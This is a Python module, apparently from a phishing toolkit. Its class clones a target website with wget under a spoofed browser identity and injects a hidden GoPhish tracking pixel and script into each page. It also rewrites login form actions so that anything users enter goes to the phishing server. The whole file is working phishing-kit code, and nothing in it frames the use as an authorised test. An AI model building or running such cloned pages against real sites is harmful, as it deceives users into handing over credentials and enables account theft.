"""
Landing Page Cloner — mirrors target pages and injects tracking.
Created by ANONYMOUS-BETA
"""

import re
from pathlib import Path
from typing import Optional, List

from . import config as cfg
from .utils import ensure_directory, run_command


class LandingPageCloner:
    """Clone landing pages and inject GoPhish tracking."""

    def __init__(self, forsake):
        self.forsake = forsake

    def clone(self, target_url: str, name: str = None) -> str:
        """
        Clone a landing page using wget.
        Returns the path to the cloned page.
        """
        if name is None:
            parsed = target_url.replace("https://", "").replace("http://", "").split("/")[0]
            name = parsed.replace(".", "_")

        output_path = cfg.LANDING_DIR / name
        ensure_directory(output_path)

        print(f"[*] Cloning {target_url} → {output_path}...")

        cmd = (
            f'wget --mirror --level=5 --page-requisites --adjust-extension '
            f'--convert-links --no-parent --no-check-certificate '
            f'--timestamping --random-wait --tries=3 '
            f'--directory-prefix={output_path} '
            f'--user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
            f'AppleWebKit/537.36 (KHTML, like Gecko) '
            f'Chrome/125.0.0.0 Safari/537.36" '
            f'{target_url}'
        )

        rc, out, err = run_command(cmd, timeout=120)

        if rc == 0 or rc == 8:
            html_count = len(list(output_path.rglob("*.html")))
            print(f"[+] Page cloned: {html_count} HTML files")
            return str(output_path)
        else:
            raise RuntimeError(f"Cloning failed (code {rc}): {err}")

    def inject_tracking(self, page_dir: str, tracking_path: str = "/track") -> int:
        """
        Inject GoPhish tracking pixel and JavaScript into all HTML files.
        Returns the number of files injected.
        """
        page_path = Path(page_dir)
        html_files = list(page_path.rglob("*.html"))

        tracking_img = f'<img src="{tracking_path}" width="1" height="1" style="display:none" />'
        tracking_script = (
            '<script>\n'
            '(function() {\n'
            '  var img = new Image();\n'
            f'  img.src = "{tracking_path}?r=" + Math.random();\n'
            '  img.style.display = "none";\n'
            '  document.body.appendChild(img);\n'
            '})();\n'
            '</script>'
        )
        tracking_pixel = f'{tracking_img}\n{tracking_script}\n'

        injected = 0
        for html_file in html_files:
            try:
                content = html_file.read_text(encoding='utf-8', errors='ignore')

                # Skip if already injected
                if '_ft' in content or '/track' in content:
                    continue

                # Inject before </body>
                if '</body>' in content:
                    content = content.replace('</body>', f'{tracking_pixel}\n</body>')
                else:
                    content += f'\n{tracking_pixel}\n'

                html_file.write_text(content, encoding='utf-8')
                injected += 1
            except Exception as e:
                print(f" [!] Skipped {html_file.name}: {e}")

        print(f"[+] Tracking injected into {injected}/{len(html_files)} HTML files")
        return injected

    def get_cloned_pages(self) -> List[dict]:
        """List all cloned landing pages."""
        pages = []
        if cfg.LANDING_DIR.exists():
            for item in cfg.LANDING_DIR.iterdir():
                if item.is_dir():
                    html_count = len(list(item.rglob("*.html")))
                    size = sum(f.stat().st_size for f in item.rglob("*") if f.is_file())
                    pages.append({
                        "name": item.name,
                        "path": str(item),
                        "html_files": html_count,
                        "size_bytes": size,
                    })
        return pages

    def modify_form_action(self, page_dir: str, original_action: str, new_action: str) -> int:
        """
        Replace form action URLs in cloned pages.
        Useful for redirecting form submissions to GoPhish.
        """
        page_path = Path(page_dir)
        html_files = list(page_path.rglob("*.html"))
        modified = 0

        for html_file in html_files:
            try:
                content = html_file.read_text(encoding='utf-8', errors='ignore')
                if original_action in content and new_action not in content:
                    content = content.replace(original_action, new_action)
                    html_file.write_text(content, encoding='utf-8')
                    modified += 1
            except Exception:
                pass

        return modified
